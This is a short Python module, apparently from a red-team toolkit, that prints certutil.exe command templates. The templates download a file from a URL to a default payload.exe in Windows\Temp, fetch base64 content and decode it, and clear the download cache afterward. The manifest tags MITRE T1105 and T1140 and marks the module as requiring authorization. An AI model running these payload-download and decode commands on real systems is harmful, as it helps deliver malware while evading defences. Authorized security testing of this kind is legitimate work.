"""certutil.exe LOLBin — download, encode, decode, hash verification."""
from __future__ import annotations
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.certutil.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["file_download", "file_creation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1105", "T1140"],
}

CERTUTIL_OPS = {
    "download": 'certutil.exe -urlcache -split -f "{url}" "{output}"',
    "encode": 'certutil.exe -encode "{input}" "{output}"',
    "decode": 'certutil.exe -decode "{input}" "{output}"',
    "hash_md5": 'certutil.exe -hashfile "{input}" MD5',
    "hash_sha256": 'certutil.exe -hashfile "{input}" SHA256',
    "b64_download": 'certutil.exe -urlcache -split -f "{url}" C:\\Windows\\Temp\\enc.b64 && certutil.exe -decode C:\\Windows\\Temp\\enc.b64 "{output}"',
}


def run(args: Any) -> int:
    op = getattr(args, "certutil_op", "download")
    url = getattr(args, "url", None)
    input_file = getattr(args, "input_file", None)
    output_file = getattr(args, "output_file", "C:\\Windows\\Temp\\payload.exe")
    generate_only = getattr(args, "generate", True)

    template = CERTUTIL_OPS.get(op)
    if not template:
        print("[!] Unknown op: {} (available: {})".format(op, ", ".join(CERTUTIL_OPS.keys())))
        return 1

    cmd = template.format(url=url or "<URL>", input=input_file or "<INPUT>",
                          output=output_file)
    print("[*] certutil LOLBin ({}):".format(op))
    print("  {}".format(cmd))

    if op == "download":
        print("\n[*] Cleanup: certutil.exe -urlcache -split -f \"{url}\" delete".format(url=url or "<URL>"))
    return 0
